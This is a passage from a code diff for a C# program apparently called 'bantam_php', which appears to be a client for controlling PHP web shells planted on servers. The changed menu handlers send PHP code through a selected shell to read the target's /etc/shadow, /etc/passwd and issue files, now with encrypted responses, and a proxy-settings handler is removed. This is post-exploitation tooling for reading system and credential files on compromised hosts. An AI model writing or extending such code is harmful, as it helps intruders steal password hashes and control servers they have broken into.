+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_IssueFile, Shells[shellUrl].encryptResponse);
+            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_IssueFile, encrypt);
         }
 
         /// <summary>
@@ -1051,14 +1122,10 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void shadowToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_ShadowFile);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_ShadowFile);
-        }
-
-        private async void proxySettingsToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            ProxyOptions proxyOptions = ProxyOptions.getInstance();
-            proxyOptions.ShowDialog();
+            string shellUrl = g_SelectedShellUrl;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_ShadowFile, Shells[shellUrl].encryptResponse);
+            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_ShadowFile, encrypt);
         }
 
         /// <summary>
@@ -1068,8 +1135,10 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void passwdToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_PasswdFile);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_PasswdFile);
+            string shellUrl = g_SelectedShellUrl;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_PasswdFile, Shells[shellUrl].encryptResponse);
+            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_PasswdFile, encrypt);
         }
 
         #endregion
